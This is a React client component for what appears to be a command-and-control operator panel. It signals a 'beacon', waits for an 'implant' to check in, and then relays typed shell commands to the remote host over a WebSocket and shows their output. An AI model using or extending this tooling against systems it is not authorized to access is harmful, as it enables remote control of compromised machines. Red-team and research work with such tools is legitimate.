'use client';
import { useEffect, useRef, useState } from 'react';

type Phase = 'idle' | 'connecting' | 'waiting' | 'connected' | 'disconnected';

export default function WebShellClient({
  beaconId,
  beaconUuid,
  idleTimeout,
}: {
  beaconId: number;
  beaconUuid: string;
  idleTimeout: number;
}) {
  const [phase, setPhase] = useState<Phase>('idle');
  const [lines, setLines] = useState<string[]>([]);
  const [countdown, setCountdown] = useState<number | null>(null);
  const [info, setInfo] = useState('');
  const wsRef = useRef<WebSocket | null>(null);
  const inputRef = useRef<HTMLInputElement>(null);
  const outputRef = useRef<HTMLDivElement>(null);
  const lastActivityRef = useRef<number>(Date.now());
  const idleTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const countdownTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  function append(line: string) {
    setLines(prev => [...prev, line]);
    setTimeout(() => {
      if (outputRef.current) outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }, 0);
  }

  function clearTimers() {
    if (idleTimerRef.current) { clearInterval(idleTimerRef.current); idleTimerRef.current = null; }
    if (countdownTimerRef.current) { clearInterval(countdownTimerRef.current); countdownTimerRef.current = null; }
  }

  async function terminate(ws: WebSocket | null) {
    clearTimers();
    ws?.close();
    await fetch(`/api/beacons/${beaconId}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ action: 'shell_clear' }),
    });
    setPhase('disconnected');
  }

  async function connect() {
    setPhase('connecting');
    setLines([]);

    // Signal beacon
    await fetch(`/api/beacons/${beaconId}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ action: 'shell' }),
    });

    const proto = window.location.protocol === 'https:' ? 'wss' : 'ws';
    const ws = new WebSocket(`${proto}://${window.location.host}/ws/shell/${beaconUuid}/connect`);
    ws.binaryType = 'arraybuffer';
    wsRef.current = ws;

    ws.onmessage = (ev) => {
      lastActivityRef.current = Date.now();
      const raw = ev.data instanceof ArrayBuffer
        ? new TextDecoder().decode(ev.data)
        : String(ev.data);
      try {
        const msg = JSON.parse(raw);
        if (msg.type === 'waiting') {
          const lastSeen: number = msg.last_seen || 0;
          setPhase('waiting');
          clearTimers();
          countdownTimerRef.current = setInterval(() => {
            const ago = Math.floor((Date.now() / 1000) - lastSeen);
            setCountdown(60 - ago);
          }, 1000);
        } else if (msg.type === 'connected') {
          clearTimers();
          setPhase('connected');
          setInfo(`${msg.hostname} (${msg.username})`);
          // Start idle timer
          idleTimerRef.current = setInterval(() => {
            if (Date.now() - lastActivityRef.current > idleTimeout * 1000) {
              append('--- idle timeout, connection closed ---');
              terminate(wsRef.current);
            }
          }, 10_000);
          setTimeout(() => inputRef.current?.focus(), 50);
        } else if (msg.type === 'disconnected') {
          clearTimers();
          append('--- implant disconnected ---');
          setPhase('disconnected');
        }
      } catch {
        // raw command output
        append(raw);
      }
    };

    ws.onclose = () => {
      clearTimers();
      setPhase(p => p === 'connected' ? 'disconnected' : p);
    };

    ws.onerror = () => {
      clearTimers();
      setPhase('disconnected');
    };
  }

  function sendCmd() {
    const input = inputRef.current;
    if (!input || !wsRef.current || wsRef.current.readyState !== WebSocket.OPEN) return;
    const cmd = input.value.trim();
    if (!cmd) return;
    input.value = '';
    lastActivityRef.current = Date.now();
    append(`$ ${cmd}`);
    wsRef.current.send(cmd);
  }

  // Cleanup on unmount
  useEffect(() => () => { clearTimers(); wsRef.current?.close(); }, []);

  return (
    <div className="space-y-4 max-w-3xl">
      <div className="flex items-center gap-3">
        <span className={`inline-block w-2.5 h-2.5 rounded-full ${
          phase === 'connected' ? 'bg-green-400' :
          phase === 'waiting' || phase === 'connecting' ? 'bg-yellow-400' :
          'bg-gray-600'
        }`} />
        <span className="text-sm font-mono">
          {phase === 'idle' && 'not connected'}
          {phase === 'connecting' && 'signalling beacon...'}
          {phase === 'waiting' && (
            countdown !== null
              ? `last contact ${60 - countdown}s ago... expecting contact in ${countdown}s...`
              : 'waiting...'
          )}
          {phase === 'connected' && `shell — ${info}`}
          {phase === 'disconnected' && 'disconnected'}
        </span>
        {(phase === 'connected' || phase === 'waiting' || phase === 'connecting') && (
          <button
            onClick={() => terminate(wsRef.current)}
            className="text-xs px-2 py-0.5 border border-red-800 text-red-400 hover:bg-red-900 hover:text-red-200 transition-colors ml-auto"
          >
            terminate
          </button>
        )}
      </div>

      {phase === 'idle' && (
        <button
          onClick={connect}
          className="text-xs px-3 py-1.5 bg-gray-800 hover:bg-gray-700 text-gray-200 rounded"
        >
          connect
        </button>
      )}

      {phase === 'disconnected' && (
        <button
          onClick={connect}
          className="text-xs px-3 py-1.5 bg-gray-800 hover:bg-gray-700 text-gray-200 rounded"
        >
          reconnect
        </button>
      )}

      {(phase === 'connected' || lines.length > 0) && (
        <div
          ref={outputRef}
          className="bg-black border border-gray-700 p-3 font-mono text-xs text-green-300 h-96 overflow-y-auto whitespace-pre-wrap"
        >
          {lines.map((l, i) => <div key={i}>{l}</div>)}
        </div>
      )}

      {phase === 'connected' && (
        <div className="flex gap-2">
          <span className="text-xs text-gray-400 font-mono self-center">$</span>
          <input
            ref={inputRef}
            type="text"
            className="flex-1 bg-black border border-gray-700 text-white text-xs font-mono p-2 focus:outline-none focus:border-white"
            placeholder="command"
            onKeyDown={e => e.key === 'Enter' && sendCmd()}
          />
          <button
            onClick={sendCmd}
            className="text-xs px-3 py-1 border border-gray-600 text-gray-300 hover:border-white hover:text-white transition-colors"
          >
            send
          </button>
        </div>
      )}
    </div>
  );
}
